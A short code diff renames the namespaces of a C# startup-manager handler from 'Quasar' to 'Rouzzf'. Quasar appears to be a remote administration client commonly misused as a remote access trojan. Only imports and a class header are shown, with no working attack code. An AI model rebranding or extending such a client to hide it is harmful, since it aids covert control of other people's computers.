@@ -1,16 +1,16 @@
 ﻿using Microsoft.Win32;
-using Quasar.Client.Extensions;
-using Quasar.Client.Helper;
-using Quasar.Common.Enums;
-using Quasar.Common.Helpers;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+using Rouzzf.Client.Extensions;
+using Rouzzf.Client.Helper;
+using Rouzzf.Common.Enums;
+using Rouzzf.Common.Helpers;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class StartupManagerHandler : IMessageProcessor
     {
